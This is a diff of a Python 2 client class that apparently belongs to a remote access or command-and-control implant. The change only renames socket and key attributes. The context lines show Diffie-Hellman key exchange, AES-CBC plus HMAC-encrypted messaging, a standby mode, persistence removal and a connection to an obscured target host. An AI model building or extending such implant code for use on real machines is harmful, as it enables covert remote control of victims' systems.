@@ -208,7 +208,7 @@ class Client(object):
             ciphertext  = self._encrypt(block)
             msg = '{}:{}\n'.format(method, ciphertext)
             try:
-                self.socket.sendall(msg)
+                self._socket.sendall(msg)
             except socket.error: return
             if len(data):
                 return self._send(data, method)
@@ -219,10 +219,10 @@ class Client(object):
     def _receive(self):
         try:
             data = ""
-            self.socket.setblocking(False) if self.standby.status else self.socket.setblocking(True)
+            self._socket.setblocking(False) if self.standby.status else self._socket.setblocking(True)
             while "\n" not in data:
                 try:
-                    data += self.socket.recv(1024)
+                    data += self._socket.recv(1024)
                 except socket.error: return
             data = self._decrypt(data.rstrip()) if len(data) else data
             return data
@@ -236,8 +236,8 @@ class Client(object):
             g = 2
             a = bytes_to_long(os.urandom(32))
             xA = pow(g, a, p)
-            self.socket.sendall(long_to_bytes(xA))
-            xB = bytes_to_long(self.socket.recv(256))
+            self._socket.sendall(long_to_bytes(xA))
+            xB = bytes_to_long(self._socket.recv(256))
             x = pow(xB, a, p)
             return SHA256.new(long_to_bytes(x)).digest()
         except Exception as e:
@@ -248,9 +248,9 @@ class Client(object):
         try:
             text = self._pad(bytes(plaintext))
             iv = os.urandom(AES.block_size)
-            cipher = AES.new(self.dhkey[:16], AES.MODE_CBC, iv)
+            cipher = AES.new(self._dhkey[:16], AES.MODE_CBC, iv)
             ciphertext = iv + cipher.encrypt(text)
-            hmac_sha256 = HMAC.new(self.dhkey[16:], msg=ciphertext, digestmod=SHA256).digest()
+            hmac_sha256 = HMAC.new(self._dhkey[16:], msg=ciphertext, digestmod=SHA256).digest()
             output = b64encode(ciphertext + hmac_sha256)
             return output
         except Exception as e:
@@ -261,9 +261,9 @@ class Client(object):
         try:
             ciphertext  = b64decode(ciphertext)
             iv          = ciphertext[:AES.block_size]
-            cipher      = AES.new(self.dhkey[:16], AES.MODE_CBC, iv)
+            cipher      = AES.new(self._dhkey[:16], AES.MODE_CBC, iv)
             check_hmac  = ciphertext[-SHA256.digest_size:]
-            calc_hmac   = HMAC.new(self.dhkey[16:], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
+            calc_hmac   = HMAC.new(self._dhkey[16:], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
             output      = cipher.decrypt(ciphertext[len(iv):-SHA256.digest_size])
             if check_hmac != calc_hmac:
                 self._logger.log(40, 'HMAC-SHA256 hash authentication check failed - transmission may have been compromised', extra={'submodule': self.name})
@@ -321,7 +321,7 @@ class Client(object):
                     if self.__v__:
                         print 'Error removing persistence: {}'.format(str(e2))
             try:
-                self.socket.close()
+                self._socket.close()
             except: pass
             try:
                 if self.__f__:
@@ -580,8 +580,8 @@ class Client(object):
             
     def _start(self):
         try:
-            self.socket  = self._connect(host=self._target(o=self.__a__, p=self.__b__))
-            self.dhkey   = self._diffiehellman()
+            self._socket  = self._connect(host=self._target(o=self.__a__, p=self.__b__))
+            self._dhkey   = self._diffiehellman()
             while True:
                 if self._exit:
                     break
